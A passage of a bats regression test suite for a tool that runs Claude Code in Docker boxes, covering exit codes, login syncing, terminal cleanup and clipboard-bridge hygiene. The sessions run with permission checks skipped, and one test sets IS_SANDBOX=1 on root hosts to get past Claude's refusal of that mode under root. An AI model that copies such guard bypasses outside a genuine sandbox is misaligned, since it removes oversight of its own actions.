  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  # … but the rotated SSH-agent socket source is gone.
  mock_docker_inspect "$(printf 'bind|%s\nbind|%s\n' \
    "$TEST_TEMP/project" "$TEST_TEMP/run/com.apple.launchd.GONE/Listeners")"

  run cmd_start "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  run docker_calls
  assert_output --partial "docker rm -f $cname"
  assert_output --partial "docker run"
  refute_output --partial "docker start $cname"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/clip"
}

@test "regression: containers are created with --init so PID 1 reaps zombies" {
  # Without --init, PID 1 inside the box is `su`, which never wait()s on
  # re-parented children. Orphans from agent subshells accumulate as zombies
  # until the box hits --pids-limit: fork() fails, node aborts mid-frame, and
  # the attached terminal freezes (observed live: a 2-day box wedged at the
  # pids cap with ~900 zombie bash procs). --init makes docker's bundled tini
  # PID 1, which reaps everything and forwards SIGTERM (so `cleat stop` no
  # longer burns its full timeout and SIGKILLs, the historical fleet all
  # shows Exited(137) for this reason).
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "--init"
  assert_success
}

@test "regression: claude's exit code survives clip-daemon cleanup in the session script" {
  # The session script used to end with `kill/wait $_MY_CLIP_DAEMON`, so the
  # `bash -c` exit status was the daemon wait's 0, masking a crashed claude
  # (SIGSEGV=139, SIGABRT=134) as a clean session end, whose rc==0 branch then
  # ERASED the crash message bash had just printed. The script must capture
  # claude's status and exit with it.
  run exec_claude "test-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has 'claude "$@"'
  assert_success
  run assert_docker_exec_has 'exit "$_CLAUDE_RC"'
  assert_success
}

@test "regression: the session script propagates a crashed claude's exit code when executed" {
  # The text-pin above can't catch a capture-ORDER regression: moving
  # _CLAUDE_RC=$? after the daemon kill re-masks crashes with the kill's 0.
  # So capture the ACTUAL script sent to docker exec and run it with a
  # SIGSEGV-ing claude stub: the wrapper must exit 139, not 0.
  local script_file="$TEST_TEMP/inner_script"
  docker() {
    if [[ "$1" == "exec" ]]; then
      local arg prev=""
      for arg in "$@"; do
        if [[ "$prev" == "-c" && "$arg" == *"clip-daemon &"* ]]; then
          printf '%s' "$arg" > "$script_file"
        fi
        prev="$arg"
      done
      return 0
    fi
    command docker "$@"
  }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  [ -s "$script_file" ] || { echo "session script not captured"; return 1; }
  mkdir -p "$TEST_TEMP/fakebin"
  printf '#!/usr/bin/env bash\nexit 139\n' > "$TEST_TEMP/fakebin/claude"
  printf '#!/usr/bin/env bash\nsleep 30\n' > "$TEST_TEMP/fakebin/clip-daemon"
  chmod +x "$TEST_TEMP/fakebin/claude" "$TEST_TEMP/fakebin/clip-daemon"
  run env PATH="$TEST_TEMP/fakebin:$PATH" CLEAT_CLIP_DIR="$TEST_TEMP" \
    bash "$script_file" --dangerously-skip-permissions
  assert_failure 139
}

@test "regression: docker exec stderr surfaces when the session fails" {
  # Host-side docker errors ('exec failed: resource temporarily unavailable'
  # during fork lockup, daemon connection resets) were thrown away by
  # 2>/dev/null, leaving the user with a corrupted terminal and zero
  # diagnostics. On a non-zero exit they must be shown.
  _wait_for_coder_remap() { true; }
  _ensure_docker_access() { true; }
  export DOCKER_STDERR="exec failed: resource temporarily unavailable"
  export DOCKER_EXIT_CODE=1
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "exited with code 1"
  assert_output --partial "resource temporarily unavailable"
}

@test "regression: interactive session restores terminal state after docker exec" {
  # A hard-dying claude (SIGSEGV under amd64 emulation, fork lockup) leaves
  # the host terminal in raw mode with alt-screen/mouse-tracking on, every
  # keystroke and scroll sprays escape garbage until a manual `reset`.
  # exec_claude must always run the terminal-restore path after the exec.
  _restore_terminal() { echo "RESTORE_TERMINAL_CALLED"; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "RESTORE_TERMINAL_CALLED"
}

@test "regression: clean session end emits no cursor-up erase into a pipe" {
  # The rc==0 branch unconditionally printed '\033[A\033[2K' (cursor-up +
  # erase-line) even when stdout was not a terminal, corrupting piped/captured
  # output, and after a masked crash it deleted the crash evidence itself.
  # The erase is cosmetic TTY furniture: it must be TTY-gated.
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "Session ended"
  refute_output --partial $'\033[A'
}

@test "regression: clean session end clears the success line so stale terminal bytes can't survive" {
  # Observed on a heavily-used terminal: a stray hash tail ("e001861") trailed
  # the "cleat resume" message. Cause: the reclaim sequence moved up, erased the
  # line ABOVE, dropped back down, then success() wrote from column 0 WITHOUT
  # clearing to end-of-line, so stale bytes already on that row survived past
  # the message. Fix: clear the destination line too (a trailing \033[2K after
  # the \r\n). Force TTY so the (TTY-gated) sequence is actually emitted.
  _is_tty() { return 0; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  assert_output --partial "Session ended"
  # Erase the reclaimed line above, drop down, AND clear the success line.
  assert_output --partial $'\033[A\033[2K\r\n\033[2K'
}

@test "regression v0.16.4: resizing the Docker VM does not trigger config drift" {
  # The fingerprint folded in resolve_box_memory, whose default is a quarter of
  # the Docker VM clamped to [4g,8g]. So nudging the Docker memory slider, or a
  # CLI release that retunes that formula (the 2g→4g floor change in v0.16.1),
  # moved the hash and fired a false "config changed, recreate?" on a box the
  # user never touched. The fingerprint now reads CONFIGURED resources only, so
  # an unconfigured box hashes the same no matter the VM size or CLI version.
  run bash -c '
    source "'"$CLI"'"
    ACTIVE_CAPS=(git env); _RESOLVED_ENV_ARGS=(-e "FOO=bar")
    proj="'"$TEST_TEMP"'/vmproj"; mkdir -p "$proj"
    CLEAT_GLOBAL_CONFIG="'"$TEST_TEMP"'/no-such-config"
    _docker_vm_memory() { echo "$(( 7 * 1073741824 ))"; }
    h1="$(compute_config_fingerprint "$proj")"
    _docker_vm_memory() { echo "$(( 48 * 1073741824 ))"; }
    h2="$(compute_config_fingerprint "$proj")"
    [[ "$h1" == "$h2" ]] || { echo "DRIFTED: $h1 vs $h2" >&2; exit 1; }
    echo "STABLE"
  '
  assert_success
  assert_output --partial "STABLE"
}

@test "regression v0.16.4: a legacy (pre-v2) config-hash is never nagged to recreate" {
  # Containers created before the v0.16.4 fingerprint format carry a bare hash
  # whose inputs we can't reconstruct (old formula, unknown VM size at creation).
  # The upgrade to v0.16.4 must NOT prompt them to recreate (the exact false
  # positive being fixed): only current-format (v2:) hashes are compared, anything
  # else is left untouched until its next genuine recreate.
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "0123456789abcdef"; }   # bare legacy hash, no v2: prefix
    compute_config_fingerprint() { echo "anything-different"; }
    _is_tty() { return 0; }
    echo "y" | _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  refute_output --partial "Config changed"
}

@test "regression v0.16.4: a fired Claude-update prompt closes with a trailing blank" {
  # After "Claude Code upgraded", the bring-up (Container started …) printed flush
  # against the confirmation. The prompt opens with a blank line, so it must also
  # close with one, but only when it actually fired (a throttled/no-op start prints
  # neither). SENTINEL stands in for the bring-up; the blank must survive before it.
  run bash -c '
    source "'"$CLI"'"
    _is_tty() { return 0; }
    image_exists() { return 0; }
    _upgrade_claude_image() { echo "UPGRADE_CALLED"; return 0; }
    CLAUDE_CHECK_FILE="'"$TEST_TEMP"'/.cuc"
    CLEAT_FORCE_CLAUDE_CHECK=1
    CLEAT_FAKE_REMOTE_CLAUDE="2.1.149"
    _image_claude_version() { echo "2.1.40"; }
    out="$( _maybe_prompt_claude_update <<< "y"; printf "SENTINEL\n" )"
    last="$(printf "%s\n" "$out" | tail -2 | head -1)"
    [[ -z "$last" ]] || { echo "NO TRAILING BLANK; last=[$last]" >&2; exit 1; }
    echo "BLANK_OK"
  '
  assert_success
  assert_output --partial "BLANK_OK"
}

@test "regression v0.16.4: the Docker VM size rounds to the slider, not the kernel's reported floor" {
  # img_1.png: a 16 GB Docker Desktop slider is reported by `docker info` as the
  # guest kernel's MemTotal (~15.6 GiB; the kernel reserves some at boot). Flooring
  # that printed a misleading "15 GB" and false-positived the undersized advisory on
  # a VM that was sized right. Rounding to the nearest GB recovers the slider's 16;
  # a genuine 15 GB slider (~14.6 GiB) still rounds to 15, so the two stay distinct.
  run bash -c '
    source "'"$CLI"'"
    [[ "$(_vm_gb_rounded 16750372454)" == "16" ]] || { echo "16 GB slider misread as $(_vm_gb_rounded 16750372454)" >&2; exit 1; }
    [[ "$(_vm_gb_rounded 15676000000)" == "15" ]] || { echo "15 GB slider misread" >&2; exit 1; }
    [[ "$(_vm_gb_rounded 8589934592)"  == "8"  ]] || { echo "8 GiB exact misread" >&2; exit 1; }
    # A digit-only value with a leading zero must read base-10, not abort as octal.
    [[ "$(_vm_gb_rounded 016750372454)" == "16" ]] || { echo "zero-padded value misread as [$(_vm_gb_rounded 016750372454)]" >&2; exit 1; }
    echo "ROUNDS_OK"
  '
  assert_success
  assert_output --partial "ROUNDS_OK"
}

@test "regression v0.16.4: the prune notice and the VM advisory are separated by a blank line" {
  # img_1.png: on a daily check both the bloat→prune prompt and the undersized-VM
  # advisory fire. They ran flush ("Pruned N images." directly above "Docker VM
  # memory is ..."). The advisory must own a blank line above it even when an earlier
  # notice already printed (the old `$printed || echo ""` suppressed that separator).
  run bash -c '
    source "'"$CLI"'"
    PRESSURE_CHECK_FILE="'"$TEST_TEMP"'/regr-pressure-nostamp"; rm -f "$PRESSURE_CHECK_FILE"
    _is_tty() { return 0; }
    _cleat_prunable_stats() { printf "7\t8192"; }     # bloat → prune offered (stamp absent → due)
    _docker_vm_memory() { echo "8589934592"; }        # 8 GiB VM (undersized)
    _host_total_memory() { echo "34359738368"; }      # 32 GiB Mac
    _running_memory_limits_sum() { echo "0"; }
    _is_docker_desktop() { return 0; }
    cmd_prune() { echo "PRUNE_DONE"; }
    out="$(_maybe_check_docker_pressure <<< "y")"
    before="$(printf "%s\n" "$out" | grep -B1 "Docker VM memory is" | head -1)"
    [[ -z "${before// /}" ]] || { echo "NOT SEPARATED; line above=[$before]" >&2; exit 1; }
    echo "SEPARATED_OK"
  '
  assert_success
  assert_output --partial "SEPARATED_OK"
}

@test "regression v0.16.5: a 24 GB Docker Desktop slider displays as 24 GB, not 23" {
  # img: "Docker tuned for Cleat (23 GB VM ...)" while the slider was set to 24. The
  # guest kernel's MemTotal for a 24 GB VM lands ~23.4 GiB (the kernel reserve grows
  # with VM size), and round-to-nearest reads that as 23, indistinguishable from a
  # genuine 23 GB slider. The configured slider value (MemoryMiB) must drive the
  # display. Revert _docker_vm_display_gb to _vm_gb_rounded and this reads 23.
  run bash -c '
    source "'"$CLI"'"
    cfg="$(_DD_MEMORY_MIB=24576 _docker_vm_display_gb 25125558681)"   # ~23.4 GiB MemTotal
    [[ "$cfg" == "24" ]] || { echo "24 GB slider displayed as [$cfg]" >&2; exit 1; }
    # The disambiguation MemTotal alone cannot make: rounding ~23.4 GiB reads 23.
    [[ "$(_vm_gb_rounded 25125558681)" == "23" ]] || { echo "expected the rounded MemTotal to read 23" >&2; exit 1; }
    # No settings and no override falls back to rounding the MemTotal.
    fb="$(_DD_SETTINGS_DIR="'"$TEST_TEMP"'/no-dd" _docker_vm_display_gb 17179869184)"
    [[ "$fb" == "16" ]] || { echo "fallback misread 16 GiB as [$fb]" >&2; exit 1; }
    echo "SLIDER_OK"
  '
  assert_success
  assert_output --partial "SLIDER_OK"
}

@test "regression v0.16.5: the bridge does not re-open a plain link the terminal already opened" {
  # The link double-open (a 2nd tab ~0.5s later): the host terminal opens a clicked
  # URL itself AND the in-container open shim writes the bridge, so the watcher
  # opened it a second time. On an interactive terminal the bridge must DEFER plain
  # links. Drop the host_opens_clicks gate and this opens (the duplicate returns).
  # Retargeted for the browser destination gate, which added a fourth argument.
  # The duplicate-tab property this regression exists for is untouched: auto plus
  # an interactive terminal plus a plain link still defers. The third line
  # INVERTED, and deliberately: off a TTY a plain link now defers too, because
  # that window is cleat login, a pipe, cron and nohup, where nobody is watching
  # the browser. `always` carries the old behaviour and is asserted here so the
  # escape hatch cannot regress either.
  run bash -c '
    source "'"$CLI"'"
    # auto + interactive terminal + plain link -> defer (rc 1). The duplicate.
    if _browser_should_open auto 1 0 1; then echo "PLAIN OPENED (duplicate)" >&2; exit 1; fi
    # auto + interactive + allowlisted auth URL -> still opens (the bridge owns login URLs).
    _browser_should_open auto 1 1 1 || { echo "auth URL wrongly deferred" >&2; exit 1; }
    # auto + no terminal + plain -> defers now, and always still opens it.
    if _browser_should_open auto 0 0 1; then echo "PLAIN OPENED UNATTENDED" >&2; exit 1; fi
    _browser_should_open always 0 0 0 || { echo "always stopped being a full bypass" >&2; exit 1; }
    echo "NO_DUP_OK"
  '
  assert_success
  assert_output --partial "NO_DUP_OK"
}

@test "regression v1.1.0: overload notice does not set-e abort start with exactly ONE running session" {
  # The session-count pluralization `session$( (( n != 1 )) && printf s )` in a
  # PLAIN assignment returns exit 1 when n==1 (the && short-circuits the sub),
  # which under the CLI's `set -euo pipefail` aborted the start/resume/run path
  # before launching the box. Strict mode is LIVE here because we source the RAW
  # CLI (not source_cli, which strips set -e). Reverting the fix re-crashes this
  # (the assertions after the assignment are never reached).
  run bash -c '
    source "'"$CLI"'"
    PRESSURE_CHECK_FILE=/dev/null
    _is_tty() { return 0; }
    _cleat_prunable_stats() { printf "0\t0"; }
    _docker_vm_memory() { echo 8589934592; }            # 8 GiB VM
    _running_memory_limits_sum() { echo 42949672960; }  # 40 GiB -> overloaded
    _running_cleat_box_count() { echo 1; }              # the singular case
    _host_total_memory() { echo 34359738368; }
    _is_docker_desktop() { return 1; }
    _maybe_check_docker_pressure
    echo "REACHED_END_OK"
  '
  assert_success
  assert_output --partial "1 session still running"
  assert_output --partial "REACHED_END_OK"
}

# ─────────────────────────────────────────────────────────────────────────────
# 2026-07-07 login regressions (in-box code-paste flow + cross-box identity)
# ─────────────────────────────────────────────────────────────────────────────

# 2026-07-07 hardening: _is_auth was keyed on the loopback port, so any OAuth
# authorize URL WITHOUT a localhost callback (Claude's code-paste login URL,
# gh-auth-style flows) classified as a PLAIN link and, in an interactive
# session (auto mode, host_opens_clicks=1), was deferred to a terminal that
# never opens programmatically emitted URLs: a stranded login. Claude 2.1.x
# hands its opener only the loopback URL today (the primary regression was the
# missing $BROWSER, see the next test), but a non-loopback authorize URL
# reaching the bridge must never strand a login again.
@test "regression v1.1.1: code-paste login URL (no loopback callback) still auto-opens in an interactive session" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _auth_callback_proxy() { :; }   # must not be reached: there is no port
  cat > "$TEST_TEMP/fake_open" <<SCRIPT
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
SCRIPT
  chmod +x "$TEST_TEMP/fake_open"
  # _extract_callback_port is intentionally NOT mocked: the URL has no
  # loopback callback, and the watcher must open it anyway.
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?code=true&client_id=abc&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "code-paste login URL was deferred; in-session login never reaches a browser"; return 1; }
  run cat "$TEST_TEMP/opened.log"
  assert_output --partial "console.anthropic.com"
}

# Claude Code 2.1.191+ refuses to invoke ANY opener on a display-less Linux
# system unless \$BROWSER is set, and its login drops to the manual code-paste
# flow: the open shim never fired, so the bridge never even saw the login URL.
# Creating the box with BROWSER pointing at the shim flips both gates (URLs
# open through the bridge, and the hands-free loopback login returns).
@test "regression v1.1.1: container is created with BROWSER pointing at the open shim" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "BROWSER=/usr/local/bin/open-bridge"
  assert_success
}

# The v1.1.1 fix above only lands at CREATE: docker exec inherits the
# container's Config.Env, frozen at create time, so a box created before
# v1.1.1 never sees that -e BROWSER and claude 2.1.191+ still drops to the
# manual code-paste login on every /login, forever. Nothing ever nags a
# recreate (the config fingerprint deliberately excludes cleat-injected env),
# so long-lived boxes stayed broken across releases; reported on real
# hardware 2026-07-11. Every session exec must therefore carry BROWSER
# itself, healing existing boxes with no recreate.
@test "regression: attaching to a box created before v1.1.1 still gets BROWSER at exec time" {
  # exec_claude alone, no cmd_run first: the recorded exec is the ONLY place
  # BROWSER can come from, exactly like a pre-v1.1.1 container's frozen env.
  run exec_claude "prev111-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has "prev111-ctr"
  assert_success
  run assert_docker_exec_has "BROWSER=/usr/local/bin/open-bridge"
  assert_success
}

# An in-box login writes oauthAccount only into THAT box's per-project
# claude.json; the host file never learns it. After a logout wiped the shared
# credentials, the user logged in again in one box, opened a second terminal,
# and was asked to log in AGAIN: the other box's claude.json had no
# oauthAccount (the login gate) even though the shared .credentials.json was
# fresh. Starting a stopped box must fold the newest sibling login in.
@test "regression v1.1.1: starting a stopped box after an in-box login elsewhere carries the login in" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }   # container exists but is NOT running
  mock_docker_ps_a "$cname"
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  rm -f "${HOME}/.claude.json"   # the host never logs in
  # the login happened inside ANOTHER box
  mkdir -p "$CLEAT_PROJECTS_DIR/box-elsewhere"
  echo '{"oauthAccount":{"emailAddress":"inbox@login.dev"},"userID":"u9"}' > "$CLEAT_PROJECTS_DIR/box-elsewhere/claude.json"
  # this box's copy predates that login (the logout wiped its oauthAccount)
  local key
  key="$(_derive_project_session_key "$TEST_TEMP/project" "main")"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  echo '{"projects":{}}' > "$CLEAT_PROJECTS_DIR/$key/claude.json"

  run cmd_start "$TEST_TEMP/project"
  assert_output --partial "Container started"
  run jq -r '.oauthAccount.emailAddress' "$CLEAT_PROJECTS_DIR/$key/claude.json"
  assert_output "inbox@login.dev"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings"
}

# An in-box /logout leaves hasCompletedOnboarding:false in that box's live
# bind-mounted ~/.claude.json (and deletes the shared credentials). Claude
# 2.1.x gates its startup login/onboarding screen on that flag ALONE, and
# cleat re-forced it only at container (re)create, so every new session in the
# still-running box demanded a login again, even after a fresh login elsewhere
# had restored the shared credentials. Attaching must heal the file in place
# (same inode: the bind mount pins it) when no live agent is in the box.
@test "regression v1.1.1: attaching to a running logged-out box heals its claude.json in place" {
  local cname="heal-ctr"
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  mkdir -p "$_RESOLVED_PROJECT"
  local key
  key="$(_derive_project_session_key "$_RESOLVED_PROJECT" "main")"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  local f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  echo '{"hasCompletedOnboarding":false,"projects":{}}' > "$f"
  # the identity to inherit lives in a sibling box (where the user logged in)
  mkdir -p "$CLEAT_PROJECTS_DIR/box-elsewhere2"
  echo '{"oauthAccount":{"emailAddress":"heal@login.dev"}}' > "$CLEAT_PROJECTS_DIR/box-elsewhere2/claude.json"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() { return 1; }   # no claude/node running in the box

  local inode_before inode_after
  inode_before="$(ls -i "$f" | awk '{print $1}')"
  run exec_claude "$cname" --dangerously-skip-permissions
  inode_after="$(ls -i "$f" | awk '{print $1}')"

  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "true"
  run jq -r '.oauthAccount.emailAddress' "$f"
  assert_output "heal@login.dev"
  [ "$inode_before" = "$inode_after" ] || { echo "inode changed: the bind-mounted file was swapped, the running box would keep reading the old one"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.1.1 (latent since the settings mask): a fresh host that never ran native
# claude has no ~/.claude/settings.json, and on macOS Docker Desktop the
# settings mask (a FILE bind nested inside the ~/.claude bind) fails with an
# opaque OCI "outside of rootfs" error when its target is missing inside the
# parent bind's source (VirtioFS cannot create files at nested bind targets).
# Every developer machine masked the bug because the file existed; the
# integration suite run against a real macOS daemon (2026-07-10) exposed it.
# The fix pre-creates the target as '{}' (valid JSON, inert for native
# claude), exactly like the history.jsonl touch above it in cmd_run.
@test "regression v1.1.1: fresh host without ~/.claude/settings.json can create a box under virtiofs" {
  export DOCKER_STUB_SIMULATE_VIRTIOFS=1
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  rm -f "$HOME/.claude/settings.json"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The pre-created target must be valid JSON so native claude still parses it.
  run cat "$HOME/.claude/settings.json"
  assert_output "{}"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: on a root-only host (a stock VPS image, `sudo cleat`) the
# entrypoint's uid remap makes the box user uid 0, and claude hard-refuses
# --dangerously-skip-permissions under uid 0 (its root/sudo guard,
# anthropics/claude-code#9184), so every session died at launch with "Claude
# exited with code 1" right after a green bring-up. IS_SANDBOX=1 is upstream's
# own bypass for sandboxed containers (their reference devcontainer sets it).
# It must ride CLAUDE_ENV (every exec, like the BROWSER heal) so existing root
# boxes heal on their next session, and must stay OUT of the env on non-root
# hosts so an ordinary box's environment is unchanged.
@test "regression v1.2.0: root host rides IS_SANDBOX=1 on every session exec, non-root stays clean" {
  # CLAUDE_ENV is built at SOURCE time from `id -u`, so both branches must be
  # exercised in fresh subprocesses with a shimmed id (a shell function beats
  # the PATH binary inside command substitution), same technique as the
  # COLORTERM test in exec_claude.bats.
  local stripped="$TEST_TEMP/cli_stripped_rootenv"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$stripped"
  run bash -c "id() { echo 0; }; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  assert_output --partial "IS_SANDBOX=1"
  run bash -c "id() { echo 501; }; source '$stripped'; printf '%s\n' \"\${CLAUDE_ENV[@]}\""
  assert_success
  refute_output --partial "IS_SANDBOX"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: the kit scout's generated frontmatter wrapped its description as an
# unquoted YAML plain scalar containing colon-space ("all exploration:
# finding"), which is invalid YAML ("mapping values are not allowed here").
# Claude Code silently drops an agent whose frontmatter fails to parse, so
# every kit box shipped with a dead scout: the planner CLAUDE.md kept telling
# the model to dispatch it, and every dispatch errored "Agent type 'scout'
# not found". The worker survived only because its wrapped description
# happens to contain no colon.
@test "regression v1.2.0: kit agent frontmatter stays parseable YAML, no colon-space in unquoted scalars" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  mkdir -p "$TEST_TEMP/project" && cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  _box_kit_write "$cname" "plan-big-execute-small"
  _generate_kit_overlay "$cname"
  [ -f "$CLEAT_RUN_DIR/$cname/kit/agents/kit-scout.md" ]
  [ -f "$CLEAT_RUN_DIR/$cname/kit/agents/kit-worker.md" ]
  # Minimal plain-scalar YAML check over every generated agent frontmatter:
  # inside the --- block, strip the "key: " prefix, skip quoted values, then
  # reject any remaining colon-space or trailing colon on any line (either
  # one flips a plain scalar into a mapping and kills the parse).
  local f
  for f in "$CLEAT_RUN_DIR/$cname/kit/agents"/kit-*.md; do
    run awk '
      NR==1 && $0=="---" { infm=1; next }
      infm && $0=="---" { exit bad }
      infm {
        line=$0
        if (line ~ /^[A-Za-z_-]+:([ \t]|$)/) sub(/^[A-Za-z_-]+:[ \t]*/, "", line)
        if (line ~ /^["'\'']/) next
        if (line ~ /: / || line ~ /:[ \t]*$/) { print FILENAME ": bad plain scalar: " $0; bad=1 }
      }
      END { exit bad }
    ' "$f"
    assert_success
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: _read_keypress mapped every unrecognized escape sequence to the same
# case as a bare Escape key: ESC. Arrow-key variants it didn't decode (only
# UP/DOWN were handled) and every other escape sequence (PgUp \e[5~, PgDn,
# Home, End, F-keys) all fell through to ESC. Both the kit picker and the
# caps picker's event loops treat ESC as "cancel with nothing written", so a
# stray right-arrow while cycling a model, or PgUp/PgDn muscle memory, closed
# the picker outright. Fix: decode \e[C/\e[D as RIGHT/LEFT, and return OTHER
# (not ESC) for any other escape sequence; only a BARE escape (nothing
# follows the \e) is still ESC.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.0: stray arrows and unknown escape sequences never cancel the pickers" {
  run _read_keypress <<< $'\033[C'
  assert_success
  assert_output "RIGHT"

  run _read_keypress <<< $'\033[D'
  assert_success
  assert_output "LEFT"

  run _read_keypress <<< $'\033[A'
  assert_success
  assert_output "UP"

  run _read_keypress <<< $'\033[5~'
  assert_success
  assert_output "OTHER"
}

# v0.1.0 baked in-box guidance (docker/CLAUDE.md: the clipboard-bridge rules)
# at /home/coder/.claude/CLAUDE.md in the image, and v0.1.0 also mounted the
# host's ~/.claude directory over that same path, which shadows everything
# beneath it. So no box ever saw the rules: Claude inside the box did not
# know pbcopy/xclip reach the host clipboard, and wasted turns running the
# forbidden read-back checks (xclip -o) the notes exist to prevent. The fix
# composes the notes into the generated overlay CLAUDE.md (the mask that owns
# the path in every v1.2.0+ box), user content first, notes under a marked
# header, kit section after.
@test "regression v0.1.0: clipboard-bridge box notes actually reach the box CLAUDE.md" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  mkdir -p "$TEST_TEMP/project" && cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mkdir -p "$HOME/.claude"
  echo "MY GLOBAL RULES" > "$HOME/.claude/CLAUDE.md"
  _generate_kit_overlay "$cname"
  run head -1 "$CLEAT_RUN_DIR/$cname/kit/CLAUDE.md"
  assert_output "MY GLOBAL RULES"
  run cat "$CLEAT_RUN_DIR/$cname/kit/CLAUDE.md"
  assert_output --partial "clipboard bridge forwarding"
  assert_output --partial "Do NOT try to verify clipboard contents after copying"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: The clipboard payload file ($CLEAT_RUN_DIR/<cname>/clip/clipboard)
# was never removed anywhere: _cleanup_session only sweeps dot-prefixed
# markers, and mkdir -p at attach never purges. Every attach spawns a fresh
# watcher whose polling fallback started from last_ts="", so its very first
# tick saw the leftover file as "changed" and piped a PREVIOUS session's copy
# into the host clipboard right after start. Fix is layered like the browser
# bridge's v0.6.1 fix: an age-gated sweep of the leftover at watcher startup,
# plus consume-on-read (atomic mv claim) in _do_copy so a delivered payload
# no longer exists to replay. This test seeds an old payload BEFORE the
# watcher spawns: it must be swept, not delivered, in every watch mode.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: clipboard watcher never redelivers a previous session's payload" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "stale-secret" > "$clip_dir/clipboard"
  touch -t 202001010000 "$clip_dir/clipboard"
  echo "stranded" > "$clip_dir/.claim.4242.7"
  touch -t 202001010000 "$clip_dir/.claim.4242.7"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  [ ! -f "$TEST_TEMP/copied" ] || { echo "REGRESSION: stale payload was redelivered to the host clipboard"; return 1; }
  [ ! -f "$clip_dir/clipboard" ] || { echo "REGRESSION: stale payload survived watcher startup"; return 1; }
  [ ! -f "$clip_dir/.claim.4242.7" ] || { echo "REGRESSION: stranded claim survived watcher startup"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5 (hardening): a backward host clock step (NTP correction, VM clock
# catch-up after macOS sleep) makes a leftover payload's mtime sit AHEAD of
# now, so "age > 5" never fires and the polling watcher would redeliver it,
# reproducing the stale-redelivery bug through the side door. A negative age
# must sweep too: never replaying old bytes is the fail-safe direction.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: clipboard sweep treats a future-dated leftover as stale" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "stale-from-the-future" > "$clip_dir/clipboard"
  touch -t 203001010000 "$clip_dir/clipboard"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  [ ! -f "$TEST_TEMP/copied" ] || { echo "REGRESSION: future-dated leftover was redelivered"; return 1; }
  [ ! -f "$clip_dir/clipboard" ] || { echo "REGRESSION: future-dated leftover survived watcher startup"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# Clipboard bridge symlink read-through. The clip dir is a READ-WRITE bind
# mount into the box, so the box can put a symlink where a payload belongs.
